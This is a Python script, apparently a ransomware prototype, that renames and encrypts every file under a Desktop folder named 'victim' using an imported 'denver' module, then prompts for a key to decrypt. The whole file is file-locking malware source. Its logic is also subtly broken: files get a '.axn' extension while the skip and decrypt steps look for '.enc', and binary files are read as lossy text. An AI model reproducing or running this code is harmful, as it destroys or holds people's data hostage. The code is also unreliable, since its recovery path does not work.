import os
import json
import denver  # Ensure 'denver.py' exists in the same directory
from datetime import datetime
import random

EXTENSIONS_FILE = "extensions.json"  # File to store original extensions

def load_extensions():
    """Load extensions from JSON file."""
    if os.path.exists(EXTENSIONS_FILE):
        with open(EXTENSIONS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_extensions(data):
    """Save extensions to JSON file."""
    with open(EXTENSIONS_FILE, "w") as f:
        json.dump(data, f, indent=4)



def change_extension(file_path, new_extension):
    """Change file extension, avoid conflicts by adding timestamp or random suffix."""
    dir_name, file_name = os.path.split(file_path)
    base, _ = os.path.splitext(file_name)

    new_file_name = f"{base}.{new_extension.lstrip('.')}"
    new_file_path = os.path.join(dir_name, new_file_name)

    # Handle conflicts by adding a timestamp or random suffix
    if os.path.exists(new_file_path):
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = random.randint(1000, 9999)
        new_file_name = f"{base}_{timestamp}_{random_suffix}.{new_extension.lstrip('.')}"
        new_file_path = os.path.join(dir_name, new_file_name)

    os.rename(file_path, new_file_path)
    return new_file_path


# Generate encryption key
key = denver.gen_key()
print(key)
# Load previous extensions or initialize
original_ext = load_extensions()

# Directories to process
directories_to_process = [
    os.path.join(os.path.expanduser("~"), "Desktop", "victim")
]

# Encrypt files
for directory in directories_to_process:
    if os.path.exists(directory):
        for root, _, files in os.walk(directory):
            print(f"📂 Current Directory: {root}")
            
            for file in files:
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file_path)

                # Skip if already encrypted
                if ext == ".enc":
                    print(f"    🔒 Skipping: {file_path} (Already encrypted)")
                    continue

                # Store original extension
                new_file_path = change_extension(file_path, "axn")
                original_ext[new_file_path] = ext
                save_extensions(original_ext)  # Save after each file

                # Encrypt file content
                try:
                    with open(new_file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()

                    encrypted_content, _ = denver.encrypt(content, key)

                    with open(new_file_path, "w", encoding="utf-8") as f:
                        f.write(encrypted_content)

                    print(f"    ✅ Encrypted: {file_path} ➝ {new_file_path}")

                except Exception as e:
                    print(f"    ❌ Error: {e}")

# Decryption loop
while True:
    action = input("Enter 'd' to decrypt or 'q' to quit: ").strip().lower()

    if action == "d":
        user_key = input("🔑 Enter Key: ").strip()

        for directory in directories_to_process:
            if os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    print(f"📂 Current Directory: {root}")

                    for file in files:
                        file_path = os.path.join(root, file)

                        if not file_path.endswith(".enc"):
                            continue

                        try:
                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                encrypted_content = f.read()

                            decrypted_content = denver.decrypt(encrypted_content, user_key)

                            if decrypted_content is not None:
                                with open(file_path, "w", encoding="utf-8") as f:
                                    f.write(decrypted_content)

                                # Restore original extension
                                original_extension = original_ext.get(file_path, ".txt")
                                restored_path = change_extension(file_path, original_extension.lstrip("."))

                                print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")
                            else:
                                print(f"    ❌ Incorrect key. Skipping {file_path}")

                        except Exception as e:
                            print(f"    ❌ Error: {e}")

    elif action == "q":
        print("👋 Exiting...")
        break
